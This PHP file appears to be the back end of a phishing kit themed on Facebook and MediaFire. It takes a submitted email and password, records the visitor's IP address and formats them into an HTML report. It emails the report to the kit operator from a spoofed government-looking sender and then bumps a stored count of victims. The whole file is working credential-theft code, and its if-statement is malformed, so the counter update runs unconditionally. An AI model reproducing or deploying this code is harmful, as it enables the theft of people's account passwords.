<?php
$alx_email_fb2 = $_POST['email'];
$alx_password_fb2 = $_POST['sandi'];
$ip = $_SERVER['REMOTE_ADDR'];
        
$subjek = "$alx_email_fb2 | Result MediaFire";
$pesan = <<<EOD
<!DOCTYPE html>
	<html>
	<head>
		<title></title>
		<meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no"/>
		<style type="text/css">
			body {
				font-family: "Helvetica";
				width: 90%;
				display: block;
				margin: auto;
				border: 1px solid #fff;
				background: #fff;
			}

			.result {
				width: 100%;
				height: 100%;
				display: block;
				margin: auto;
				position: fixed;
				top: 0;
				right: 0;
				left: 0;
				bottom: 0;
				z-index: 999;
				overflow-y: scroll;
				border-radius: 10px;
			}

			.tblResult {
				width: 100%;
				display: table;
				margin: 0px auto;
				border-collapse: collapse;
				text-align: center;
				background: #fcfcfc;
			}
			.tblResult th {
				text-align: left;
				font-size: 1em;
				margin: auto;
				padding: 15px 10px;
				background: #001240;
				border: 2px solid #001240;
				color: #fff;
			}

			.tblResult td {
				font-size: 1em;
				margin: auto;
				padding: 10px;
				border: 2px solid #001240;
				text-align: left;
				font-weight: bold;
				color: #000;
				text-shadow: 0px 0px 10px #fcfcfc;

			}

			.tblResult th img {
				width: 100%;
				display: block;
				margin: auto;
				box-shadow: 0px 0px 10px rgba(0,0,0, 0.5);
				border-radius: 10px;
			}
		</style>
	</head>
	<body>
		<div class="result">
			<table class="tblResult">
<tr>
					<th style="text-align: center;" colspan="3"> Info Facebook </th>
				</tr>
				<tr>
					<td style="border-right: none;">Email</td>
					<td style="text-align: center;">$alx_email_fb2</td>
				</tr>
                <tr>
					<td style="border-right: none;">Password</td>
					<td style="text-align: center;">$alx_password_fb2</td>
				</tr>
			    <tr>
			        <td style="border-right: none;">IP Address</td>
					<td style="text-align: center;">$ip</td>
				</tr>			
				<tr>
					<th style="text-align: center;" colspan="3">©AlexHostX</th>
				</tr>
			</table>
		</div>
	</body>
	</html>
EOD;

// RESULT DATA
$resultGet = file_get_contents("data/data.json");
$resultData = json_decode($resultGet,true);

$headers  = 'MIME-Version: 1.0' . "\r\n";
$headers .= 'Content-type: text/html; charset=iso-8859-1' . "\r\n";
$headers .= 'From: '.$resultData['nama'].' <admin@salzz.go.id>' . "\r\n";

if(mail($resultData['email'], $subjek, $pesan, $headers))
include 'salzzhehe.php';
{
$upGet = file_get_contents("data/data.json");
$upData = json_decode($upGet,true);
$hasil = $upData['totals'] + 1;
$upData['totals'] = $hasil;
$upResult = json_encode($upData);
$upFile = fopen('data/data.json','w');
          fwrite($upFile,$upResult);
          fclose($upFile);
}
?>